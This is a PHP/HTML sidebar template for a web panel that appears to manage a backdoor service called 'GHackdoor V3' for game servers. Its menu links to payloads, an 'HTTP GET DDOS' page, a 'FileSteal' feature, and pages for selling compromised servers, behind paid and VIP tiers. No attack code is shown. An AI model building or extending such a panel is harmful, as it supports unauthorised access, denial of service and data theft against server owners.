
    <!-- Sidebar -->
    <ul class="navbar-nav bg-gradient-<?php echo Account::GetUser()["color"]; ?> sidebar sidebar-<?php echo Account::GetUser()["color"]; ?> accordion" id="accordionSidebar">

      <!-- Sidebar - Brand -->
      <a class="sidebar-brand d-flex align-items-center justify-content-center" href="dashboard.html">
        <div class="sidebar-brand-icon">
          <img src="images/wicon.png">
        </div>
      </a>
      <hr class="sidebar-divider">
            

      <li class="nav-item">
        <a class="nav-link collapsed text-<?php echo Account::GetUser()["color_second"]; ?>" href="#" data-toggle="collapse" data-target="#collapseYou" aria-expanded="true" aria-controls="collapseYou">
          <span class="mr-2 d-none d-lg-inline text-gray-600">
<img style="padding: 4px 4px;" width="64" height="64" class="img-profile rounded-circle" <?php $usr = Account::GetUser($_SESSION["id"]); echo 'src='.$usr["pdp"].'' ?> />
      <?php  echo $usr["username"]; ?></span>
        </a>
        <div id="collapseYou" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionSidebar">
          <div class="bg-<?php echo Account::GetUser()["color"]; ?> py-2 collapse-inner rounded">
            <h6 class="collapse-header"><?php echo Account::GetCredit();?> CC</h6>
            <hr class="sidebar-divider">
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="seeuser.php?user=<?php echo $usr["id"]; ?>">Profile</a>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="settings.html">
              <?php echo $lang["settings"]; ?></a>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"  href="#" data-toggle="modal" data-target="#logoutModal"><?php echo $lang["logout"]; ?></a>
          </div>
        </div>
      </li>

      <hr class="sidebar-divider">
      <!-- Nav Item - Dashboard -->
      <li class="nav-item active">
        <a class="nav-link" href="dashboard.html">
            <i class="fas fa-fw fa-tachometer-alt collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"></i>
            <span class="text-<?php echo Account::GetUser()["color_second"]; ?>"><?php echo $lang["dashboard"]; ?></span></a>
          <a class="nav-link" href="servers.html">
            <i class="fas fa-fw fa-server collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"></i>
            <span class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"><?php echo $lang["servers"]; ?></span></a>
            <?php if(!IsFREE($_SESSION['id'])){ ?>
            <a class="nav-link" href="beta/dashboard.php">
            <i class="fas fa-fw fas fa-window-restore collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"></i>
            <span class="text-<?php echo Account::GetUser()["color_second"]; ?>">GHackdoor V3 Beta</span></a>
          <?php }else{
          
?>
<a class="nav-link" href="/#packs">
            <i class="fas fa-fw fas fa-window-restore collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"></i>
            <span class="p-3 mb-2 text-success"><blink>GHackdoor V3</span></a>
            <a class="nav-link" href="/#packs">
            <?php
          } ?>
      </li>

      <!-- Divider -->
      <hr class="sidebar-divider">


      <!-- Nav Item - Pages Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link collapsed text-<?php echo Account::GetUser()["color_second"]; ?>" href="#" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">
          <i class="fas fa-fw fa-cog"></i>
          <span><?php echo $lang["servers"]; ?></span>
        </a>
        <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionSidebar">
          <div class="bg-<?php echo Account::GetUser()["color"]; ?> py-2 collapse-inner rounded">
            <h6 class="collapse-header"><?php echo $lang["servers"]; ?></h6>
            <hr class="sidebar-divider">
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="deconnecter.html"><?php echo $lang["offlineservers"]; ?></a>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="acheter.html"><?php echo $lang["sellservers"]; ?></a>
          </div>
        </div>
      </li>

      <!-- Nav Item - Utilities Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link collapsed text-<?php echo Account::GetUser()["color_second"]; ?>" href="#" data-toggle="collapse" data-target="#collapseUtilities" aria-expanded="true" aria-controls="collapseUtilities">
          <i class="fas fa-users"></i>
          <span><?php echo $lang["user"]; ?></span>
        </a>
        <div id="collapseUtilities" class="collapse" aria-labelledby="headingUtilities" data-parent="#accordionSidebar">
          <div class="bg-<?php echo Account::GetUser()["color"]; ?> py-2 collapse-inner rounded">
            <h6 class="collapse-header"><?php echo $lang["user"]; ?></h6>
            <hr class="sidebar-divider">
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="settings.html"><?php echo $lang["settings"]; ?></a>
          </div>
        </div>
      </li>

      <li class="nav-item">
        <a class="nav-link collapsed text-<?php echo Account::GetUser()["color_second"]; ?>" href="#" data-toggle="collapse" data-target="#collapseExtras" aria-expanded="true" aria-controls="collapseExtras">
          <i class="fas fa-fw fa-wrench"></i>
          <span><?php echo $lang["extra"]; ?></span>
        </a>
        <div id="collapseExtras" class="collapse" aria-labelledby="headingUtilities" data-parent="#accordionSidebar">
          <div class="bg-<?php echo Account::GetUser()["color"]; ?> py-2 collapse-inner rounded">
            <h6 class="collapse-header">Extras</h6>
            <hr class="sidebar-divider">
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="payloads.html">Payloads</a>
            <?php if(!IsFREE($_SESSION['id'])){ ?>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="joueurs.html"><?php echo $lang["players"]; ?></a>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="ddos.html">HTTP GET DDOS</a>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="shop.php">Shop</a>
          <?php }else{
            ?>
            <a class="nav-link" href="/#packs">
            <i class="fas fa-fw fas fa-window-restore collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>"></i>
            <span class="text-<?php echo Account::GetUser()["color_second"]; ?>"><?php echo $lang["players"]; ?></span></a>
            <?php
          } ?>
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="extra.html"><?php echo $lang["extra"]; ?></a>
          </div>
        </div>
      </li>

<?php if(IsVIP($_SESSION['id']) || IsAdmin($_SESSION['id'])) { ?>
      <li class="nav-item">
        <a class="nav-link collapsed text-<?php echo Account::GetUser()["color_second"]; ?>" href="#" data-toggle="collapse" data-target="#collapseBeta" aria-expanded="true" aria-controls="collapseBeta">
          <i class="fas fa-fw fa-band-aid"></i>
          <span>BETA</span>
        </a>
        <div id="collapseBeta" class="collapse" aria-labelledby="headingUtilities" data-parent="#accordionSidebar">
          <div class="bg-<?php echo Account::GetUser()["color"]; ?> py-2 collapse-inner rounded">
            <h6 class="collapse-header">Bêta</h6>
            <hr class="sidebar-divider">
            <a class="collapse-item text-<?php echo Account::GetUser()["color_second"]; ?>" href="file_steals.php">FileSteal</a>
          </div>
        </div>
      </li>
    <?php } ?>

      <!-- Sidebar Toggler (Sidebar) -->
      <div class="text-center d-none d-md-inline">
        <button class="rounded-circle border-0" id="sidebarToggle"></button>
      </div>


    </ul>

    <!-- End of Sidebar -->
